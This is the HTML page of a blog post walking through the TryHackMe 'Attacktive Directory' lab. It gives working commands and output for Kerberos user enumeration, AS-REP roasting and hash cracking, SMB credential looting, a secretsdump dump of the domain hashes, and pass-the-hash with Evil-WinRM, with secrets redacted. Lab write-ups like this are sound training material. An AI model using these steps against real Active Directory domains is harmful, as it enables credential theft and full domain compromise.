@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Imtodess ">
+<meta name="description" content="Walkthrough For THM - Attacktive Directory Summary Attacktive Directory - “99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?”
+In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM." />
+<meta name="keywords" content=", oscp path, active Directory, thm" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://imtodess.github.io/posts/2021/07/thm-attacktive-directory-walkthrough/" />
+
+
+    <title>
+        
+            THM | Attacktive Directory | Walkthrough :: Imtodess 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://imtodess.github.io/main.1b0c2a43eaa94aafc5b56185098d0d43797dccf963fa479c7a153b858461d09a.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://imtodess.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://imtodess.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://imtodess.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://imtodess.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://imtodess.github.io/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="shortcut icon" href="https://imtodess.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#1b1c1d">
+    <meta name="theme-color" content="#1b1c1d">
+
+
+
+<meta itemprop="name" content="THM | Attacktive Directory | Walkthrough">
+<meta itemprop="description" content="Walkthrough For THM - Attacktive Directory Summary Attacktive Directory - “99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?”
+In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM.">
+<meta itemprop="datePublished" content="2021-07-23T11:32:28+05:45" />
+<meta itemprop="dateModified" content="2021-07-23T11:32:28+05:45" />
+<meta itemprop="wordCount" content="1813">
+<meta itemprop="image" content="https://imtodess.github.io/img/portrait.jpg"/>
+
+
+
+<meta itemprop="keywords" content="oscp path,active Directory,thm," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://imtodess.github.io/img/portrait.jpg"/>
+
+<meta name="twitter:title" content="THM | Attacktive Directory | Walkthrough"/>
+<meta name="twitter:description" content="Walkthrough For THM - Attacktive Directory Summary Attacktive Directory - “99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?”
+In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM."/>
+
+
+
+
+    <meta property="og:title" content="THM | Attacktive Directory | Walkthrough" />
+<meta property="og:description" content="Walkthrough For THM - Attacktive Directory Summary Attacktive Directory - “99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?”
+In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://imtodess.github.io/posts/2021/07/thm-attacktive-directory-walkthrough/" />
+<meta property="og:image" content="https://imtodess.github.io/img/portrait.jpg"/>
+<meta property="article:published_time" content="2021-07-23T11:32:28+05:45" />
+<meta property="article:modified_time" content="2021-07-23T11:32:28+05:45" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-07-23 11:32:28 &#43;0545 &#43;0545" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://imtodess.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">$</span>
+            <span class="logo__text">cd ~/imtodess</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://imtodess.github.io/about/">About</a></li><li><a href="https://imtodess.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://imtodess.github.io/posts/2021/07/thm-attacktive-directory-walkthrough/">THM | Attacktive Directory | Walkthrough</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#walkthrough-for-thm---attacktive-directory">Walkthrough For THM - Attacktive Directory</a>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#welcome-to-attacktive-directory">Welcome to Attacktive Directory</a></li>
+        <li><a href="#enumerating-users-via-kerberos">Enumerating Users via kerberos</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#abusing-kerberos">Abusing Kerberos</a></li>
+        <li><a href="#back-to-basics">Back to Basics</a></li>
+      </ul>
+    </li>
+    <li><a href="#domain-privilege-escalation">Domain Privilege Escalation</a>
+      <ul>
+        <li><a href="#elevating-privileges-within-the-domain">Elevating Privileges within the domain</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="walkthrough-for-thm---attacktive-directory">Walkthrough For THM - Attacktive Directory</h2>
+<h3 id="summary">Summary</h3>
+<p>Attacktive Directory - “99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?”</p>
+<p>In this walkthrough we will learn different ways to compromise the active directory using publicly available tools. You will learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-control hashes, and how to access the machine with only NTLM hash with Evil-WinRM. So I highly recommend to go through this room yourself and get a hands on training.</p>
+<p>URL: <a href="https://tryhackme.com/room/attacktivedirectory">Attacktive Directory - THM </a></p>
+<p>Difficulty: Medium</p>
+<p>Author: <a href="https://tryhackme.com/p/Sq00ky">Sq00ky</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="welcome-to-attacktive-directory">Welcome to Attacktive Directory</h3>
+<p>First do a Nmap scan to find our which services are running on the target machine.</p>
+<pre><code>root@kali:~# nmap -p- -A -nP 10.10.100.54 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
+Nmap scan report for 10.10.100.54 
+Host is up (0.00043s latency).
+Not shown: 65508 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 10:43:23Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-04-17T10:45:49+00:00
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2020-04-03T18:40:09
+|_Not valid after:  2020-10-03T18:40:09
+|_ssl-date: 2020-04-17T10:46:02+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  msrpc         Microsoft Windows RPC
+49789/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=4/17%Time=5E99884F%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03&quot;);
+MAC Address: 02:41:2E:CE:EA:1A (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/17%OT=53%CT=1%CU=44531%PV=Y%DS=1%DC=D%G=Y%M=02412E%T
+OS:M=5E998918%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I
+OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
+OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
+OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
+OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
+OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:41:2e:ce:ea:1a (unknown)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-04-17T10:45:49
+|_  start_date: N/A
+
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 550.50 seconds
+</code></pre><p>From the Nmap scan we also get the DNS domain name. So lets add that to our <code>/etc/hosts</code> file.</p>
+<pre><code>echo 10.10.100.54  spookysec.local &gt;&gt; /etc/hosts
+</code></pre><h4 id="answers-to-the-questions">Answers to the questions</h4>
+<ul>
+<li>
+<p>What tool will allow us to enumerate port 139/445?</p>
+<p><code>SMB</code> runs on port 139/445. So to enumerate it <code>enum4linux</code> is very useful.</p>
+</li>
+<li>
+<p>What is the NetBIOS-Domain Name of the machine?</p>
+<p>See the Nmap result.</p>
+<pre><code>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-04-17T10:45:49+00:00
+</code></pre></li>
+<li>
+<p>What invalid TLD do people commonly use for their Active Directory Domain?</p>
+<p><code>.local</code> is the commonly used invalid TLD for AD domain.</p>
+</li>
+</ul>
+<h3 id="enumerating-users-via-kerberos">Enumerating Users via kerberos</h3>
+<p>From the nmap result we know that Kerberos is running on the host machine. Kerberos is a key authentication service within Active Directory. We can enumerate this service using <a href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a>.</p>
+<p>| Note: Use the wordlist from the room itself.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/thm/attacktiveDirectory]
+└─$ kerbrute userenum --dc spookysec.local -d spookysec.local ./user.txt                                                  
+    __             __               __      
+   / /_____  _____/ /_  _______  __/ /____  
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         
+
+Version: v1.0.3 (9dad6e1) - 07/20/21 - Ronnie Flathers @ropnop
+
+2021/07/20 06:35:15 &gt;  Using KDC(s):
+2021/07/20 06:35:15 &gt;   spookysec.local:88
+
+2021/07/20 06:35:16 &gt;  [+] VALID USERNAME:       james@spookysec.local
+2021/07/20 06:35:19 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2021/07/20 06:35:23 &gt;  [+] VALID USERNAME:       James@spookysec.local
+2021/07/20 06:35:24 &gt;  [+] VALID USERNAME:       robin@spookysec.local
+2021/07/20 06:35:42 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2021/07/20 06:35:53 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2021/07/20 06:36:13 &gt;  [+] VALID USERNAME:       backup@spookysec.local
+2021/07/20 06:36:23 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
+2021/07/20 06:37:27 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local
+2021/07/20 06:37:48 &gt;  [+] VALID USERNAME:       Robin@spookysec.local
+2021/07/20 06:39:56 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local
+2021/07/20 06:44:27 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
+2021/07/20 06:45:54 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local
+2021/07/20 06:50:51 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2021/07/20 06:52:20 &gt;  [+] VALID USERNAME:       ori@spookysec.local
+2021/07/20 06:54:58 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
+2021/07/20 07:01:01 &gt;  Done! Tested 73317 usernames (16 valid) in 1546.379 seconds
+</code></pre><h4 id="answers-to-the-questions-1">Answers to the questions</h4>
+<ul>
+<li>
+<p>What command within Kerbrute will allow us to enumerate valid usernames?</p>
+<p><code>userenum</code> flag allows us to enumerate the valid usernames.</p>
+</li>
+<li>
+<p>What notable account is discovered? (These should jump out at you)</p>
+<p><code>svc-admin (service admin)</code> &amp; <code>administrator</code> are the notable accounts. Most of the time <code>administrator</code> account on a network is disabled, but they haven’t here.</p>
+</li>
+<li>
+<p>What is the other notable account is discovered? (These should jump out at you)</p>
+<p>Apart from <code>svc-admin</code> &amp; <code>administrator</code> you may also want to look at <code>backup</code>.</p>
+</li>
+</ul>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="abusing-kerberos">Abusing Kerberos</h3>
+<p>After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called <code>ASREPRoasting</code>. <code>ASReproasting</code> occurs when a user account has the privilege <code>Does not require Pre-Authentication</code> set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
+<p>To know more about this topic refer to this <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a> article.</p>
+<p>We will use one of the tool from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> called <code>GetNPUsers.py</code>. To know more about <code>Kerberos pre-auth</code> and <code>GetNPUsers</code> refer to this <a href="https://www.youtube.com/watch?v=pZSyGRjHNO4&amp;t=6s">Kerberos Pre-Auth Explained</a>.</p>
+<pre><code>┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
+└─$ sudo python3 GetNPUsers.py spookysec.local/svc-admin -no-pass   
+
+Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d1d31ca7515a59e756cb73$d6a2f9ee7ccd0e820332979ca06a3d24327ce88385051fae9b21b1ef064a579[REDACTED]d962cc86dc0839eb5eb44eb144
+</code></pre><p>Save the hash to a file. And crack it using <code>hashcat</code>.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/thm/attacktiveDirectory]
+└─$ hashcat -m 18200 -a 0 hash.txt ./pass.txt   
+. . .
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d1d31ca7515a59e756cb73$d6a2f9ee7ccd0e820332979ca06a3d24327ce88385051fae9b21b1ef064a579c77d61ad4e3df41[REDACTED]b44eb144:[REDACTED]
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:31b7401610d...4eb144
+</code></pre><p>Now we have both <code>username</code> and <code>password</code>. We can use this credential to enumerate Further.</p>
+<h4 id="answers-to-the-questions-2">Answers to the questions</h4>
+<ul>
+<li>
+<p>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</p>
+<p>We can query a ticket from <code>svc-admin</code> user. <code>Administrator</code> account doesn&rsquo;t have <code>Pre-Auth</code> set for this to work.</p>
+</li>
+<li>
+<p>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</p>
+<p>Kerberos 5 AS-REP etype 23</p>
+</li>
+<li>
+<p>What mode is the hash?</p>
+<p>18200</p>
+</li>
+<li>
+<p>Now crack the hash with the modified password list provided, what is the user accounts password?</p>
+<p>Use above information above to get this answer.</p>
+</li>
+</ul>
+<h3 id="back-to-basics">Back to Basics</h3>
+<p>With a user&rsquo;s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.</p>
+<p>We will use smbclient to list the shares using the credential we got earlier.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/thm/attacktiveDirectory]
+└─$ smbclient -L $ip -U svc-admin                                       
+Enter WORKGROUP\svc-admin's password:
+        Sharename       Type      Comment         
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk       
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share  
+        SYSVOL          Disk      Logon server share  
+
+SMB1 disabled -- no workgroup available
+</code></pre><p><code>backup</code> share seems interesting.  Let&rsquo;s see the content of this share.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/thm/attacktiveDirectory]
+└─$ smbclient //10.10.100.54/backup -U svc-admin                            
+Enter WORKGROUP\svc-admin's password:  
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Apr  4 15:08:39 2020
+  ..                                  D        0  Sat Apr  4 15:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
+                8247551 blocks of size 4096. 3662067 blocks available
+smb: \&gt; get backup_credentials.txt  
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre><p>There was the text file with possible credentials to the user <code>backup</code>. Download the file to local machine and check the contents.</p>
+<p>The file had base54 encoded text. Decode it to reveal the credential.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/thm/attacktiveDirectory]
+└─$ echo &quot;YmFja3VwQHNwb29reXNlYy5sb[REDACTED]&quot; | base64 -d     
+backup@spookysec.local:[REDACTED]
+</code></pre><h4 id="answers-to-the-questions-3">Answers to the questions</h4>
+<ul>
+<li>
+<p>What utility can we use to map remote SMB shares?</p>
+<p><code>smbclient</code> &amp; <code>smbmap</code> can be used to list the SMB shares.</p>
+</li>
+<li>
+<p>Which option will list shares?</p>
+<p>In <code>smbclient</code> <code>-L</code> will list the shares.</p>
+</li>
+<li>
+<p>How many remote shares is the server listing?</p>
+<p>six</p>
+</li>
+<li>
+<p>There is one particular share that we have access to that contains a text file. Which share is it?</p>
+<p>We have <code>read/write</code> access to <code>backup</code> share.</p>
+</li>
+<li>
+<p>What is the content of the file?</p>
+<p>YmFja3VwQHNwb29reXNlYy5sb2[Redacted]</p>
+</li>
+<li>
+<p>Decoding the contents of the file, what is the full contents?</p>
+<p><a href="mailto:backup@spookysec.local">backup@spookysec.local</a>:[REDACTED]</p>
+</li>
+</ul>
+<h2 id="domain-privilege-escalation">Domain Privilege Escalation</h2>
+<h3 id="elevating-privileges-within-the-domain">Elevating Privileges within the domain</h3>
+<p>&ldquo;Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account &ldquo;backup&rdquo; gets us thinking. What is this the backup account to?</p>
+<p>Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes&rdquo;</p>
+<p>We will now attempt to enumerate additional user information using another tool from <em><strong>IMPACKET</strong></em> called <code>secretsdump.py</code>.</p>
+<pre><code>┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]    
+└─$ sudo impacket-secretsdump -just-dc backup:[REDACTED]@10.10.100.54  
+Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+Administrator:500:[REDACTED]:::
+Guest:501:[REDACTED]:::
+krbtgt:502:[REDACTED]:::
+. . .
+spookysec.local\darkstar:1108:[REDACTED]:[REDACTED]:::
+spookysec.local\Ori:1109:[REDACTED]:[REDACTED]:::               
+spookysec.local\robin:1110:[REDACTED]:[REDACTED]:::    
+spookysec.local\paradox:1111:[REDACTED]:[REDACTED]:::   
+spookysec.local\Muirland:1112:[REDACTED]:[REDACTED]:::   
+spookysec.local\horshark:1113:[REDACTED]:[REDACTED]:::   
+spookysec.local\svc-admin:1114:[REDACTED]:[REDACTED]:::         
+spookysec.local\backup:1118:[REDACTED]:[REDACTED]:::  
+spookysec.local\a-spooks:1601:[REDACTED]:[REDACTED]:::  
+ATTACKTIVEDIREC$:1000:[REDACTED]:[REDACTED]:::                            
+[*] Kerberos keys grabbed                              
+Administrator:aes256-cts-hmac-sha1-96:[REDACTED]
+Administrator:aes128-cts-hmac-sha1-96:[REDACTED]
+. . .
+</code></pre><p>We get the hashes of different accounts including the administrator. We can either decrypt the hash and connect as Administrator or use <code>Evil-winrm</code> to get a shell.</p>
+<pre><code>┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
+└─$ evil-winrm -i 10.10.100.54 -u Administrator -H [HASH_REDACTED]    
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+    Directory: C:\Users\Administrator\Desktop   
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+TryHackMe{REDACTED}
+</code></pre><h4 id="answers-to-the-questions-4">Answers to the questions</h4>
+<ul>
+<li>
+<p>What method allowed us to dump NTDS.DIT?</p>
+<p><code>DRSUAPI</code> method</p>
+</li>
+<li>
+<p>What is the Administrators NTLM hash?</p>
+<p>See the result of <code>secretsdump.py</code></p>
+</li>
+<li>
+<p>What method of attack could allow us to authenticate as the user without the password?</p>
+<p>Pass The Hash</p>
+</li>
+<li>
+<p>Using a tool called Evil-WinRM what option will allow us to use a hash?</p>
+<p><code>-H</code></p>
+</li>
+</ul>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://imtodess.github.io/tags/oscp-path/">oscp path</a></span>
+        <span class="tag"><a href="https://imtodess.github.io/tags/active-directory/">active Directory</a></span>
+        <span class="tag"><a href="https://imtodess.github.io/tags/thm/">thm</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1813 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-07-23 11:32
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://imtodess.github.io/posts/2021/07/thm-hackpark-walkthrough-no-metasploit/">
+                    <span class="button__text">THM | Hackpark | Walkthrough (No Metasploit)</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://imtodess.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
